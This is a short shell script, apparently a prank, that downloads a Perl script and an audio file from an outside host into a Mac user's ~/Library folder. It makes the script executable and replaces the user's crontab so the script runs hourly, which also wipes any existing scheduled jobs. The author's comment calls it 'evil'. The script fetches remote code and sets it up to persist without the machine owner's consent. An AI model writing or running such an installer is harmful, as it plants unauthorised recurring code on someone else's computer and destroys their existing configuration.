#!/bin/sh
#
curl http://www.broken.com/work/annoy.pl > ~/Library/Annoying.pl
chmod 755 ~/Library/Annoying.pl
mkdir -p ~/Library/AudioAnnoy
echo "Fetching NICKELBACK."
curl http://www.broken.com/work/AudioAnnoy/01.wav > ~/Library/AudioAnnoy/01.wav
echo "0 * * * * ~/Library/Annoying.pl >/dev/null 2>&1" |crontab  -

# Hat tip to George Dodd for this bit of evil
